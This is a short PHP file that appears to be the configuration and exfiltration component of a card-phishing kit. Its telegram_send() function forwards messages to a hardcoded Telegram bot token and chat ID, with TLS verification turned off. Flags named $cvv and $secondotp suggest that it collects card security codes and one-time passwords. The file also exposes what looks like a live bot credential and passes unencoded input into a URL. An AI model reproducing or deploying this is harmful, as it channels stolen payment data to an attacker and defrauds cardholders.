<?php 

function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1821520682:AAEmGr9EWWOAWA0x0IGYR91Ns9b7n9TaaZE';
    $chat_id  = '718032830';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}




$cvv='on';
$secondotp='off';
?>